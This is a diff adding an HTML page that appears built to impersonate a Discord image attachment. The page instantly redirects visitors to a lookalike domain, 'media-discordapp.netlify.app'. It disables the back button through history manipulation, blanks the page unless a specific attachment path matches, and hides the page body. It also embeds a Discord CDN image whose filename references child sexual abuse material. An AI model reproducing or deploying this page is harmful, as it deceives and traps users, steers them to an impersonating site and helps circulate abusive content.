@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+
+    <!-- Redirect meta tag to instantly go to the specified URL -->
+    <meta http-equiv="refresh" content="0;url=https://media-discordapp.netlify.app/">
+
+    <!-- History prevention (to stop going back) -->
+    <script>
+        // Push the current state so the back button doesn't work
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() {
+            history.go(1); // Prevent going back
+        };
+
+        // Ensure the page is only accessible on the specified subdomain and path
+        if (window.location.pathname !== "/attachments/1334707778308145208/1336785260058382447") {
+            // Redirect to an error page or blank page if the path doesn't match
+            window.location.href = "about:blank";  // Optional: you can change this to any other URL or custom error page
+        }
+    </script>
+
+    <!-- Disable mouse interaction -->
+    <style>
+        body {
+            display: none; /* Hides content while redirecting */
+            pointer-events: none; /* Disable all mouse interaction */
+        }
+    </style>
+</head>
+<body>
+    <!-- Image Embed (will show as an image in Discord) -->
+    <img src="https://cdn.discordapp.com/attachments/1334707778308145208/1336802943189520416/child-porn.png?ex=67a52242&is=67a3d0c2&hm=493ac512ff5ddf482cf7880f9a83020e5a1c20140edc0dc15dd9075ef498a4eb&" style="max-width: 100%; display: block; margin: 0 auto;">
+</body>
+</html>
